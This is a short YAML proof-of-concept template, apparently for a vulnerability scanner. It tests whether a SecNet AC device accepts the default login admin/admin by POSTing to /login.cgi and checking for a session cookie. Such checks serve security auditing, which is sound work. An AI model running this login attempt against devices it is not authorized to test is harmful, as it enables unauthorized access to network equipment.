name: poc-yaml-secnet-ac-default-password
manual: true
transport: http
rules:
  uc:
    request:
      cache: true
      method: POST
      path: /login.cgi
      body:
        user=admin&password=admin
    expression: response.status == 200 && response.body.bcontains(b"index.htm") && "Set-Cookie" in response.headers
expression: uc()
detail:
  author: iak3ec(https://github.com/nu0l)
  links:
    - https://bbs.secnet.cn/post/t-30